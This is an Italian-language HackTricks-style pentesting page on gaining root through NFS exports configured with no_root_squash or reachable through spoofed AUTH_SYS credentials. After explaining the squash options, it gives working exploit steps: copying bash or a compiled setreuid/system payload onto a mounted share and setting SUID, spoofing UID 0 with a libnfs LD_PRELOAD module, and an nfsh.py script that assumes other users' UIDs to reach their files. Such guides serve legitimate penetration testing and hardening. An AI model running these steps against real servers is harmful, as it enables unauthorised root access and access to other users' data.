# Escalatione dei privilegi tramite configurazione errata di NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base sullo squashing

Con NFS AUTH_SYS/AUTH_UNIX, il server basa i controlli dei permessi sui file sui valori `uid` e `gid` forniti in ogni richiesta RPC. Altri flavor di sicurezza, come Kerberos, usano credenziali diverse e il server può mappare le credenziali numeriche prima di verificare i permessi.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mappa ogni UID e GID all'account anonimo, che su Linux è `nobody` (65534) per impostazione predefinita. `no_all_squash` è l'impostazione predefinita per le richieste non root.<sup>[[4]](#references)</sup>
- **`root_squash`**: È l'impostazione predefinita su Linux e mappa le richieste con UID/GID 0 (root) all'account anonimo; gli altri UID e GID non vengono sottoposti a squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Disattiva lo squash di root, quindi le richieste con UID/GID 0 possono essere valutate come root sul server.<sup>[[4]](#references)</sup>

Se un client autorizzato può montare un export scrivibile in **`/etc/exports`** configurato con **`no_root_squash`**, le sue richieste con UID/GID 0 possono scrivere al suo interno come utente root del server.<sup>[[4]](#references)</sup>

`root_squash` rimappa solo UID/GID 0; con AUTH_SYS, un **UID/GID numerico diverso da zero** di un client autorizzato può comunque corrispondere a un altro account sul server. Un export scrivibile può quindi diventare un percorso tra utenti anche con lo squash di root, se il client può creare un file con quell'identità numerica e il server ne consente l'accesso. Per un passaggio SUID/SGID, verifica anche il proprietario del file risultante, l'accesso in esecuzione, lo stato `nosuid` del mount sul server, gli ACL e SELinux o altre policy. Il percorso esportato, l'opzione `rw` o la sola corrispondenza numerica non dimostrano che il client sia autorizzato, che l'export sia attivo o che i due host condividano la stessa mappatura effettiva delle identità. Esamina passivamente `/etc/exports` e i metadati locali; durante l'enumerazione, non montare una nuova share né creare un file di prova.<sup>[[4]](#references)[[5]](#references)</sup>

Per ulteriori informazioni su **NFS**, consulta:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Opzione 1 con bash:
- Su un client autorizzato, monta un export scrivibile come root, copia al suo interno **`/bin/bash`**, imposta il bit **SUID** ed eseguilo da un mount della vittima che non utilizza `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Per mantenere la proprietà root del file caricato, il server deve usare **`no_root_squash`**. Se root viene sottoposto a squash, un binario SUID per un altro account è possibile solo se il client può crearlo legittimamente o esserne proprietario usando l'UID/GID numerico di quell'account.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 usando codice C compilato:
- Monta la directory da un client autorizzato, copia un payload compilato che sfrutta i permessi SUID, imposta il bit **SUID** ed eseguilo dalla vittima (vedi alcuni [payload SUID in C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Stesse restrizioni di prima

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Exploit locale

> [!TIP]
> Nota: se puoi creare un **tunnel dalla tua macchina alla macchina vittima, puoi comunque usare la versione Remote per sfruttare questa privilege escalation inoltrando le porte necessarie**.\
> Il seguente trucco è utile quando `/etc/exports` limita l'esportazione all'IP della vittima: il client remoto non può montarla, ma la tecnica locale può operare tramite la condivisione già montata sull'host autorizzato.<sup>[[2]](#references)</sup>\
> Per questo metodo libnfs non privilegiato, l'esportazione in **`/etc/exports`** deve usare il flag `insecure` affinché il processo possa usare una porta sorgente non riservata; `secure` è l'impostazione predefinita, anche se un processo in grado di associarsi a una porta riservata non ha bisogno di questa opzione.<sup>[[1]](#references)[[4]](#references)</sup>

### Informazioni di base

Un client NFSv3 AUTH_UNIX include il proprio UID effettivo, GID e gruppi in ogni chiamata, e il server li usa per verificare i permessi. Questa tecnica locale sfrutta questo modello falsificando le credenziali RPC tramite [libnfs](https://github.com/sahlberg/libnfs); il suo modulo preload supporta la sovrascrittura di UID/GID nel contesto NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilazione della libreria

L'esempio libnfs potrebbe richiedere modifiche per il kernel target; la guida qui usata specifica che, prima di compilare il modulo preload, è necessario commentare le syscall fallocate.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Esecuzione dell'Exploit

L'esempio crea un piccolo helper in C che avvia una shell, poi lo colloca sulla share e usa `ld_nfs.so` con UID 0 nel contesto NFS per renderlo SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compila il codice dell'exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Posiziona l'exploit sulla share e modifica i suoi permessi falsificando l'UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Esegui l'exploit per ottenere privilegi di root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell per un accesso stealthy ai file

Una volta ottenuto l’accesso root, questo schema `nfsh.py` imposta l’UID effettivo sull’UID del file target prima di eseguire un comando, consentendo l’accesso senza modificare ricorsivamente la proprietà.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Esegui così:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [La storia di un privesc NFS poco conosciuto](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specifica del protocollo NFS versione 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
